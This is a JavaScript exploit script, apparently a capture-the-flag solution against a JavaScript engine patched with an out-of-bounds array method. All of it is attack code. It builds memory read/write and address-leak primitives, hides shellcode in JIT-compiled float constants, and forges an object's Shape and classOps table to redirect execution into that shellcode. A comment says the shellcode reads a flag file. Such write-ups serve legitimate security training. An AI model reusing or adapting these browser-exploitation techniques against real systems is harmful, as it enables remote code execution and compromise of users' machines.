var pos = 8;

var buffer = new ArrayBuffer(8);
var double = new Float64Array(buffer)
var u8     = new Uint8Array(buffer);
var u16    = new Uint16Array(buffer);
var u32    = new Uint32Array(buffer);
var u64    = new BigUint64Array(buffer);


var arr = new Array(1,2,3,4,5,6,7,8);
var target = new BigUint64Array(4);
target[0] = 0x1337beefb00b5n;
target[1] = 0x1337beefb00b5n;

var dummy = () => {return 0x1337}
const memory = new Array(100);

while (d2i(arr.oob(++pos)) != 0x1337beefb00b5n);
const olddata = arr.oob(pos-1);


function i2d(x) {
  u64[0] = x;
  return double[0];
}

function d2i(x) {
  double[0] = x;
  return u64[0];
}

function read64(addr) {
  arr.oob(pos-1, i2d(addr));
  const ret = target[0] & 0xffffffffffffffffffn;
  arr.oob(pos-1, olddata);
  return ret;
}

function write64(addr, data) {
  arr.oob(pos-1, i2d(addr));
  target[0] = data & 0xffffffffffffffffn;
  arr.oob(pos-1, olddata);
}

function jitter(){
  const identifier = 2393736.541207228;

  const sc0 = -2.006367637410192e-231
  const sc1 = 1.5971205077477222e-270
  const sc2 = 1.5971204514315905e-270
  const sc3 = 1.5971204514728005e-270
  const sc4 = 1.5971205077336806e-270
  const sc5 = -6.611712277200432e-229
  const sc6 = 4.498786531865945e-256
  const sc7 = -3.1662384206294947e+178
}

// order matters cause, jitter is jit'd after dummy
for (var iter = 0; iter < 0x100000; iter++) dummy();
for (var iter = 0; iter < 0x100000; iter++) jitter();

function addrof(x) {
  const oldvalue = target[0];
  arr.oob(pos, x);
  const leak = target[0] & 0xffffffffffffn;
  arr.oob(pos, oldvalue)
  return leak
}

const target_addr = addrof(target);
console.log('[*] Target addr: 0x' + target_addr.toString(16))

const target_data_addr = d2i(arr.oob(pos-1));
console.log('[*] Target data addr: 0x' + target_data_addr.toString(16))

var jit_ptr = d2i(arr.oob(pos+10))
// console.log('[*] RX ptr: 0x' + jit_ptr.toString(16))
var jit_addr = read64(jit_ptr)
console.log('[*] RX addr: 0x' + jit_addr.toString(16))

while (read64(++jit_addr) != 0x4142434445464748n);
var shellcode = jit_addr + 14n;
console.log('[*] Shellcode at: 0x' + shellcode.toString(16))

const memory_buffer_addr = addrof(memory) + 0x38n;
const shape_ptr_ptr = read64(target_addr);
const shape_ptr = read64(shape_ptr_ptr);
const shape = read64(shape_ptr);

console.log('[*] Old Shape: 0x' + shape.toString(16))
console.log('[*] New Shape: 0x' + memory_buffer_addr.toString(16))

// memory[0] = i2d(0x44444444n);


// copy shape to new shape buffer
for (var i = 0n; i < 6n; i++) {
  // console.log(read64(shape + (i * 8n)).toString(16));
  memory[i] = i2d(read64(shape + (i * 8n)));
}

const class_ops = d2i(memory[2]);
const new_class_ops = memory_buffer_addr + (6n * 8n);
console.log('[*] Old classOps: 0x' + class_ops.toString(16))
console.log('[*] New classOps: 0x' + new_class_ops.toString(16))


memory[2] = i2d(new_class_ops);

memory[6]  = i2d(1n);
memory[7]  = i2d(0xcccccccccccc26ebn);
memory[8]  = i2d(3n);
memory[9]  = i2d(4n);
memory[10] = i2d(shellcode);
memory[11] = i2d(shellcode);

// orw ./flag.txt, lazy to create reverse shell XD
memory[12] = 6.805649372755533e+38
memory[13] = -2.4923024921154913e+35
memory[14] = 8.957335156596666e+38
memory[15] = -51203745681807.07
memory[16] = 4.778659012155622e-305
memory[17] = -6.189238375467606e+37
memory[18] = 1.5705477433460727e+43
memory[19] = -2.4923024934207533e+35
memory[20] = 8.957335156596279e+38
memory[21] = -2.4923024935656356e+35
memory[22] = 5.292984574286701e-87
memory[23] = 1.7058643057456533e+272
memory[24] = -6.828527034368756e-229


write64(shape_ptr, memory_buffer_addr)
target.lol = 0;